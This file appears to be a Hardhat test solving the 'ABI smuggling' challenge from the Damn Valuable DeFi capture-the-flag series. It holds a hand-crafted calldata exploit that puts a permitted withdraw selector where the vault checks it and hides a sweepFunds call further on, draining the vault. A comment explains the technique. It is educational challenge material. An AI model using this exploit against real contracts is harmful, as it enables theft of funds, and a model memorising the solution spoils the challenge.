const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // https://www.evm-function-selector.click
        // function execute(address,bytes)
        const executeFunctionSignature = "0x1cff79cd";
        const target = "0".repeat(24) + vault.address.slice(2);
        const actionDataLocation = "0".repeat(62) + "80";
        const randomData = "babe".repeat(16) + "d9caed12" + "babe".repeat(14);
        const actionDataLength = "0".repeat(62) + "44";
        const actionData = "85fb709d" + "0".repeat(24) + recovery.address.slice(2) + "0".repeat(24) + token.address.slice(2);
        const calldata = executeFunctionSignature + target + actionDataLocation + randomData + actionDataLength + actionData;

        await player.sendTransaction({
            to: vault.address,
            value: ethers.utils.parseEther("0"),
            data: calldata,
        });

        /*
        Explanation:
        The Ethereum Virtual Machine packs transaction call data like this:
                4 bytes         32 bytes        32 bytes
        [ FUNCTION SELECTOR ] [ ARGUMENT 1 ] [ ARGUMENT 2 ] ...

        When an argument is an address, the address goes like this: 24 zeros + address (because an address has only 20 bytes).
        When an argument A is type bytes, it takes one 32 byte slot which is a pointer to X, where the data begins.
        At X, there's another 32 byte slot which tells the length of A, and immediately after comes A itself.

        In this problem, we have a vault on which we can only execute one action: withdraw 1 ETH every 15 days.
        The function execute() lets us call withdraw() on the contract if we want.
        The contract allows us to call withdraw() by checking if the function selector on the bytes [100 to 103] of our calldata
        matches the allowed selector d9caed12.

        But we can manipulate our calldata to put whatever we want on bytes [100 to 103]. We make the checker think
        that we're calling withdraw(), but we're actually calling sweepFunds().
        
        That way, we craft the following call data:

                4 bytes         32 bytes        32 bytes            32 bytes        32 bytes                    32 bytes            68 bytes
        [ FUNCTION SELECTOR ] [ ARGUMENT 1 ] [ ARGUMENT 2 ] ...
        [       EXECUTE     ] [ VAULT ADDR ] [ ACTION DATA PTR ] [ RANDOM DATA ] [ d9caed12 + RANDOM DATA ] [ACTION DATA LENGTH] [ ACTION DATA ]

        And our action data is an encoded call to sweepFunds(recovery, token).
        To sum it up: the checker is checking a function selector at a specific offset,
        but we can manipulate our call to put whatever selector in there while keeping our real action data further on the right.
        */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
